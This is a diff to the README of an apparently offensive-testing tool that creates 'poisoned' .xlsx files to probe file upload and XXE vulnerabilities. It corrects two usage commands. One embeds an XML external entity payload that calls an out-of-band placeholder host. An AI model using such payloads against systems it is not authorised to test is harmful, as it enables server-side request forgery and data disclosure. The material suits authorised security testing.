@@ -15,10 +15,10 @@ This tool is designed to test for file upload and XXE (XML External Entity) vuln
 
 Poison .XLSX file ☣️
 ```
-python3 --file test.xlsx --xxe "<\!DOCTYPE ShiftSecurityConsulting [ <\!ENTITY xxe SYSTEM 'http://out-of-band.url'> ]>" --output poisoned.xlsx
+python3 XXElixir.py --file test.xlsx --xxe "<\!DOCTYPE ShiftSecurityConsulting [ <\!ENTITY xxe SYSTEM 'http://out-of-band.url'> ]>" --output poisoned.xlsx
 ```
 ```
-python3 --file test.xlsx --url https://shiftsecurityconsulting.com --output poisoned.xlsx
+python3 XXElixir.py --file test.xlsx --url https://shiftsecurityconsulting.com --output poisoned.xlsx
 ```
 
 ## Running from Docker 🐳
